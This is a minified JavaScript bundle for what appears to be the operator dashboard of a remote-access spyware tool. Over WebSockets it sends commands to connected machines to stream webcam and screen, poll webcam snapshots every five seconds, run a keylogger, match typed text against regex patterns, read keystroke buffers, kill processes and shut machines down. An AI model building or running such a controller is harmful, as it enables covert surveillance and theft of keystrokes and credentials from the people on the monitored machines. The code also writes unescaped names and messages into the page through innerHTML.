var v=Object.defineProperty;var T=(e,t,s)=>t in e?v(e,t,{enumerable:!0,configurable:!0,writable:!0,value:s}):e[t]=s;var m=(e,t,s)=>T(e,typeof t!="symbol"?t+"":t,s);(function(){const t=document.createElement("link").relList;if(t&&t.supports&&t.supports("modulepreload"))return;for(const o of document.querySelectorAll('link[rel="modulepreload"]'))a(o);new MutationObserver(o=>{for(const i of o)if(i.type==="childList")for(const u of i.addedNodes)u.tagName==="LINK"&&u.rel==="modulepreload"&&a(u)}).observe(document,{childList:!0,subtree:!0});function s(o){const i={};return o.integrity&&(i.integrity=o.integrity),o.referrerPolicy&&(i.referrerPolicy=o.referrerPolicy),o.crossOrigin==="use-credentials"?i.credentials="include":o.crossOrigin==="anonymous"?i.credentials="omit":i.credentials="same-origin",i}function a(o){if(o.ep)return;o.ep=!0;const i=s(o);fetch(o.href,i)}})();class E{constructor(t){m(this,"ws",null);m(this,"stats",{fps:0,frameCount:0,totalBytes:0});m(this,"lastFrameTime",0);m(this,"config");this.config=t}updateConfig(t){this.config={...this.config,...t}}isConnected(){var t;return((t=this.ws)==null?void 0:t.readyState)===WebSocket.OPEN}connect(t){return new Promise((s,a)=>{var o;if(((o=this.ws)==null?void 0:o.readyState)===WebSocket.OPEN){s();return}this.config.onLog(`ðŸ”„ Connecting to ${t}...`),this.config.onStatusChange("CONNECTING"),this.ws=new WebSocket(t),this.ws.binaryType="arraybuffer",this.ws.onopen=()=>{this.config.onLog("âœ… Connected"),this.config.onStatusChange("CONNECTED"),this.resetStats(),s()},this.ws.onerror=i=>{a(i)},this.ws.onclose=i=>{this.config.onLog(`ðŸ”Œ Disconnected: ${i.code}`),this.config.onStatusChange("DISCONNECTED")},this.ws.onmessage=async i=>this.handleMessage(i)})}disconnect(){var t;(t=this.ws)==null||t.close()}sendCommand(t){var s;((s=this.ws)==null?void 0:s.readyState)===WebSocket.OPEN?(this.ws.send(t),this.config.onLog(`ðŸ“¤ Sent: ${t}`)):this.config.onLog("âš ï¸ Not connected")}async handleMessage(t){if(typeof t.data=="string"){const a=t.data;if(a.startsWith("KEY:")){const o=a.match(/KEY:(\w+) \((\d+)\)/);o&&this.config.onKeyEvent&&this.config.onKeyEvent(o[1],parseInt(o[2]));return}if(a.startsWith("PATTERN:")){const o=a.substring(8).split(":");o.length>=2&&this.config.onPatternMatch&&this.config.onPatternMatch({patternName:o[0],matchedText:o.slice(1).join(":")});return}if(a.startsWith("BUFFER:")){this.config.onTypedBuffer&&this.config.onTypedBuffer(a.substring(7));return}this.config.onLog(`ðŸ“© Server: ${a}`);return}const s=t.data;this.updateStats(s.byteLength);try{const a=await createImageBitmap(new Blob([s]));this.config.onFrame(a)}catch{this.config.onLog("âŒ Error decoding frame")}}updateStats(t){const s=performance.now();if(this.lastFrameTime>0){const a=(s-this.lastFrameTime)/1e3;this.stats.fps=Math.round(1/a)}this.lastFrameTime=s,this.stats.frameCount++,this.stats.totalBytes+=t,this.config.onStats(this.stats)}resetStats(){this.stats={fps:0,frameCount:0,totalBytes:0},this.lastFrameTime=0}}var c=(e=>(e.START_STREAM="start_stream",e.START_WEBCAM_STREAM="start_webcam_stream",e.START_SCREEN_STREAM="start_screen_stream",e.STOP_STREAM="stop_stream",e.FRAME_CAPTURE="frame_capture",e.CAPTURE_WEBCAM="capture_webcam",e.START_KEYLOGGER="start_keylogger",e.STOP_KEYLOGGER="stop_keylogger",e.ADD_COMMON_PATTERNS="add_common_patterns",e.CLEAR_PATTERNS="clear_patterns",e.GET_TYPED_BUFFER="get_typed_buffer",e.CLEAR_BUFFER="clear_buffer",e.LIST_PROCESS="list_process",e.SHUTDOWN="shutdown",e.PING="ping",e))(c||{});function L(e){return`kill_process:${e}`}function M(e,t){return`add_pattern:${e}:${t}`}const r={machines:[{id:"1",name:"Office-PC",ip:"ws://127.0.0.1:9004",status:"checking",messages:[]}],currentMachineId:null},n={grid:document.getElementById("machineGrid"),views:{dashboard:document.getElementById("viewDashboard"),stream:document.getElementById("viewStream")},canvas:document.getElementById("screenCanvas"),backBtn:document.getElementById("backBtn"),machineName:document.getElementById("currentMachineName"),connectionDot:document.getElementById("connectionDot"),btnStart:document.getElementById("btnStart"),btnStartScreen:document.getElementById("btnStartScreen"),btnStop:document.getElementById("btnStop"),btnListProc:document.getElementById("btnListProc"),btnSnap:document.getElementById("btnSnap"),btnStartKeylogger:document.getElementById("btnStartKeylogger"),btnStopKeylogger:document.getElementById("btnStopKeylogger"),keylogDisplay:document.getElementById("keylogDisplay"),btnAddCommonPatterns:document.getElementById("btnAddCommonPatterns"),btnClearPatterns:document.getElementById("btnClearPatterns"),patternName:document.getElementById("patternName"),patternRegex:document.getElementById("patternRegex"),btnAddPattern:document.getElementById("btnAddPattern"),patternMatchDisplay:document.getElementById("patternMatchDisplay"),pidInput:document.getElementById("pidInput"),btnKillProcess:document.getElementById("btnKillProcess"),btnShutdown:document.getElementById("btnShutdown"),messageHistory:document.getElementById("messageHistory"),messageInput:document.getElementById("messageInput"),sendMessageBtn:document.getElementById("sendMessageBtn"),messageLogList:document.getElementById("messageLogList"),addMachineBtn:document.getElementById("addMachineBtn")},h=n.canvas.getContext("2d");function l(){n.grid.innerHTML="",r.machines.forEach(e=>{const t=document.createElement("div");t.className="machine-card";let s="card-preview",a="";e.status!=="online"?s+=" no-signal":e.thumbnail&&(a=`background-image: url(${e.thumbnail})`),t.innerHTML=`
            <div class="${s}" style="${a}"></div>
            <div class="card-footer">
                <div class="card-details">
                    <span class="status-dot status-${e.status}"></span>
                    <span class="card-name">${e.name}</span>
                </div>
                <span class="material-icons card-menu">more_vert</span>
            </div>
        `,t.addEventListener("click",()=>I(e)),n.grid.appendChild(t)})}function w(){const e=prompt("Enter Machine Name:","New-PC");if(!e)return;const t=prompt("Enter Machine WebSocket URL:","ws://127.0.0.1:9004");t&&(r.machines.push({id:Date.now().toString(),name:e,ip:t,status:"checking",messages:[]}),l(),C())}function d(){if(!r.currentMachineId)return;const e=r.machines.find(t=>t.id===r.currentMachineId);return e==null?void 0:e.client}function f(e,t){const s=n.patternMatchDisplay.querySelector(".pattern-placeholder");s&&s.remove();const a=document.createElement("div");a.className="pattern-match-item",a.innerHTML=`
        <span class="pattern-match-name">[${e}]</span>
        <span class="pattern-match-value">${b(t)}</span>
    `,n.patternMatchDisplay.appendChild(a),n.patternMatchDisplay.scrollTop=n.patternMatchDisplay.scrollHeight}function g(){n.patternMatchDisplay.innerHTML='<div class="pattern-placeholder">Pattern matches will appear here...</div>'}function b(e){const t=document.createElement("div");return t.textContent=e,t.innerHTML}function I(e){if(r.currentMachineId=e.id,n.machineName.textContent=e.name,n.connectionDot.className=`status-dot status-${e.status}`,n.views.dashboard.classList.remove("active"),n.views.stream.classList.add("active"),h.clearRect(0,0,n.canvas.width,n.canvas.height),n.keylogDisplay.textContent="",n.messageLogList.innerHTML="",g(),y(e),N(),e.client&&e.client.isConnected()){e.client.updateConfig({onLog:t=>p(e,t),onStats:t=>console.log("Stats:",t),onStatusChange:t=>{e.status=t==="CONNECTED"?"online":"offline",n.connectionDot.className=`status-dot status-${e.status}`,l()},onFrame:t=>{n.canvas.width=t.width,n.canvas.height=t.height,h.drawImage(t,0,0),t.close()},onKeyEvent:(t,s)=>{n.keylogDisplay.textContent+=`${t} `,n.keylogDisplay.scrollTop=n.keylogDisplay.scrollHeight},onPatternMatch:t=>{f(t.patternName,t.matchedText)}}),p(e,"âœ… Using existing connection");return}e.client=new E({onLog:t=>p(e,t),onStats:t=>console.log("Stats:",t),onStatusChange:t=>{e.status=t==="CONNECTED"?"online":"offline",n.connectionDot.className=`status-dot status-${e.status}`,l()},onFrame:t=>{n.canvas.width=t.width,n.canvas.height=t.height,h.drawImage(t,0,0),t.close()},onKeyEvent:(t,s)=>{n.keylogDisplay.textContent+=`${t} `,n.keylogDisplay.scrollTop=n.keylogDisplay.scrollHeight},onPatternMatch:t=>{f(t.patternName,t.matchedText)}}),e.client.connect(e.ip)}function P(){if(r.currentMachineId){const e=r.machines.find(t=>t.id===r.currentMachineId);e!=null&&e.client&&e.client.updateConfig({onFrame:t=>{const s=document.createElement("canvas");s.width=t.width,s.height=t.height,s.getContext("2d").drawImage(t,0,0),e.thumbnail=s.toDataURL("image/jpeg",.7),t.close(),l()},onLog:t=>console.log(`[${e.name}] ${t}`),onStats:()=>{},onKeyEvent:()=>{}})}r.currentMachineId=null,n.views.stream.classList.remove("active"),n.views.dashboard.classList.add("active")}function y(e){n.messageHistory.innerHTML="",e.messages.forEach(t=>{const s=document.createElement("div");s.className=`message-bubble message-${t.type}`,s.innerHTML=`
            ${t.text}
            <span class="message-time">${t.time}</span>
        `,n.messageHistory.appendChild(s)}),n.messageHistory.scrollTop=n.messageHistory.scrollHeight}function S(){const e=n.messageInput.value.trim();if(!e||!r.currentMachineId)return;const t=r.machines.find(a=>a.id===r.currentMachineId);if(!t)return;const s={text:e,type:"sent",time:new Date().toLocaleTimeString([],{hour:"2-digit",minute:"2-digit"})};t.messages.push(s),y(t),n.messageInput.value=""}function p(e,t){if(r.currentMachineId===e.id){const s=document.createElement("li");s.textContent=t,n.messageLogList.appendChild(s),n.messageLogList.scrollTop=n.messageLogList.scrollHeight}}function N(e){n.messageLogList.innerHTML=""}async function C(){for(const e of r.machines)if(r.currentMachineId!==e.id){if(e.client&&e.client.isConnected()){e.client.sendCommand(c.CAPTURE_WEBCAM);continue}try{const t=new E({onFrame:s=>{const a=document.createElement("canvas");a.width=s.width,a.height=s.height,a.getContext("2d").drawImage(s,0,0),e.thumbnail=a.toDataURL("image/jpeg",.7),s.close(),l()},onLog:s=>console.log(`[${e.name}] ${s}`),onStats:s=>{},onStatusChange:s=>{s==="CONNECTED"?(e.status="online",t.sendCommand(c.CAPTURE_WEBCAM)):s==="DISCONNECTED"&&(e.status="offline",e.client=void 0,l())},onKeyEvent:()=>{}});e.client=t,await t.connect(e.ip)}catch{e.status="offline",e.thumbnail=void 0,e.client=void 0,l()}}}n.addMachineBtn.addEventListener("click",w);n.backBtn.addEventListener("click",P);n.btnStart.addEventListener("click",()=>{var e;return(e=d())==null?void 0:e.sendCommand(c.START_WEBCAM_STREAM)});n.btnStartScreen.addEventListener("click",()=>{var e;return(e=d())==null?void 0:e.sendCommand(c.START_SCREEN_STREAM)});n.btnStop.addEventListener("click",()=>{var e;return(e=d())==null?void 0:e.sendCommand(c.STOP_STREAM)});n.btnSnap.addEventListener("click",()=>{var e;return(e=d())==null?void 0:e.sendCommand(c.FRAME_CAPTURE)});n.btnListProc.addEventListener("click",()=>{var e;return(e=d())==null?void 0:e.sendCommand(c.LIST_PROCESS)});n.btnStartKeylogger.addEventListener("click",()=>{var e;n.keylogDisplay.textContent="",g(),(e=d())==null||e.sendCommand(c.START_KEYLOGGER)});n.btnStopKeylogger.addEventListener("click",()=>{var e;(e=d())==null||e.sendCommand(c.STOP_KEYLOGGER)});n.btnAddCommonPatterns.addEventListener("click",()=>{var e;g(),(e=d())==null||e.sendCommand(c.ADD_COMMON_PATTERNS)});n.btnClearPatterns.addEventListener("click",()=>{var e;g(),(e=d())==null||e.sendCommand(c.CLEAR_PATTERNS)});n.btnAddPattern.addEventListener("click",()=>{var s;const e=n.patternName.value.trim(),t=n.patternRegex.value.trim();if(!e||!t){alert("Please enter both pattern name and regex");return}(s=d())==null||s.sendCommand(M(e,t)),n.patternName.value="",n.patternRegex.value=""});n.btnKillProcess.addEventListener("click",()=>{var t;const e=parseInt(n.pidInput.value);if(isNaN(e)){alert("Please enter a valid PID");return}confirm(`Kill process ${e}?`)&&((t=d())==null||t.sendCommand(L(e)),n.pidInput.value="")});n.btnShutdown.addEventListener("click",()=>{var e;confirm("Are you sure you want to shutdown this machine?")&&((e=d())==null||e.sendCommand(c.SHUTDOWN))});n.sendMessageBtn.addEventListener("click",S);n.messageInput.addEventListener("keypress",e=>{e.key==="Enter"&&S()});l();(async()=>{for(;;)await C(),await new Promise(e=>setTimeout(e,5e3))})();
